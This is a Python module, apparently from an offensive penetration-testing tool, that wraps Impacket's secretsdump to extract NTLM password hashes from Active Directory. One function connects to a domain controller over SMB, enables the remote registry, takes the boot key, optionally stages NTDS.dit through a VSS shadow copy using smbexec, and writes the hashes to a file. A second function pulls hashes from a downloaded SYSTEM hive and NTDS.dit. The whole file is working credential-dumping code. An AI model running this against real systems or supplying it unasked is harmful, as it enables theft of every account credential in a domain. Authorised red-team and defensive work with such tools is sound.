from __future__ import annotations

import logging
import sys
from pathlib import Path
from typing import Optional

from .. import console
from .target import Target, connect_smb


def _attach_impacket_handler() -> None:
    imp_log = logging.getLogger("impacket")
    if any(isinstance(h, logging.StreamHandler) for h in imp_log.handlers):
        return
    handler = logging.StreamHandler(sys.stderr)
    handler.setFormatter(logging.Formatter("impacket %(levelname)s: %(message)s"))
    imp_log.addHandler(handler)
    imp_log.setLevel(logging.WARNING)
    imp_log.propagate = False


def _run_ntds_hashes(**kwargs) -> int:
    from impacket.examples.secretsdump import NTDSHashes

    count = [0]

    def _counting_callback(*_args):
        count[0] += 1

    kwargs.setdefault("perSecretCallback", _counting_callback)

    ntds = NTDSHashes(**kwargs)
    try:
        ntds.dump()
    finally:
        try:
            ntds.finish()
        except Exception:
            pass

    return count[0]


def dump_remote(
    target: Target,
    output_prefix: Path,
    method: str = "drsuapi",
    history: bool = False,
    just_user: Optional[str] = None,
) -> Path:
    from impacket.examples.secretsdump import RemoteOperations

    _attach_impacket_handler()

    use_vss = method == "vss"
    console.info(
        f"Dumping NTDS via {method.upper()} against {target.host}"
        + (f" (user {just_user})" if just_user else "")
    )

    smb = connect_smb(target)
    console.info("SMB session established")

    remote_ops = RemoteOperations(smb, target.do_kerberos, target.dc_ip)
    remote_ops.setExecMethod("smbexec")

    secret_count = 0
    ntds_file_obj = None

    try:
        console.info("Enabling remote registry...")
        remote_ops.enableRegistry()

        console.info("Retrieving boot key...")
        boot_key = remote_ops.getBootKey()
        console.info(f"Boot key OK ({boot_key.hex() if boot_key else 'none'})")

        if use_vss:
            console.info("Creating VSS shadow copy and staging NTDS (this may take a minute)...")
            ntds_file_obj = remote_ops.saveNTDS()
            if ntds_file_obj is None:
                raise RuntimeError(
                    "saveNTDS() returned None — target may not be a DC, "
                    "or vssadmin failed to create the shadow copy."
                )
            console.info(f"NTDS staged: {ntds_file_obj}")

        console.info("Running NTDSHashes dump...")
        secret_count = _run_ntds_hashes(
            ntdsFile=ntds_file_obj,
            bootKey=boot_key,
            isRemote=True,
            history=history,
            noLMHash=True,
            remoteOps=remote_ops,
            useVSSMethod=use_vss,
            justNTLM=True,
            pwdLastSet=False,
            resumeSession=None,
            outputFileName=str(output_prefix),
            justUser=just_user,
            skipUser=None,
            ldapFilter=None,
            printUserStatus=True,
        )
        console.info(f"NTDSHashes done — {secret_count} secrets counted")

    except Exception as exc:
        raise RuntimeError(f"{method.upper()} dump failed: {exc}") from exc
    finally:
        try:
            remote_ops.finish()
        except Exception:
            pass
        try:
            smb.close()
        except Exception:
            pass

    ntds_file = Path(str(output_prefix) + ".ntds")

    if not ntds_file.exists() or ntds_file.stat().st_size == 0:
        if secret_count == 0:
            raise RuntimeError(f"{method.upper()} completed but 0 secrets were processed.")
        raise RuntimeError(
            f"Dump ran ({secret_count} secrets counted) but output file was not written."
        )

    console.info(f"Output: {ntds_file} ({secret_count} secrets)")
    return ntds_file


def secretsdump_local(
    system_hive: Path,
    ntds_dit: Path,
    output_prefix: Path,
    history: bool = False,
) -> Path:
    from impacket.examples.secretsdump import LocalOperations

    _attach_impacket_handler()
    console.info("Running secretsdump on downloaded NTDS files")
    local_ops = LocalOperations(str(system_hive))
    boot_key = local_ops.getBootKey()

    _run_ntds_hashes(
        ntdsFile=str(ntds_dit),
        bootKey=boot_key,
        isRemote=False,
        history=history,
        noLMHash=True,
        remoteOps=None,
        useVSSMethod=True,
        justNTLM=True,
        pwdLastSet=False,
        resumeSession=None,
        outputFileName=str(output_prefix),
        justUser=None,
        skipUser=None,
        ldapFilter=None,
        printUserStatus=True,
    )

    ntds_file = Path(str(output_prefix) + ".ntds")
    if not ntds_file.exists() or ntds_file.stat().st_size == 0:
        raise RuntimeError("secretsdump completed but no .ntds output was produced.")
    return ntds_file
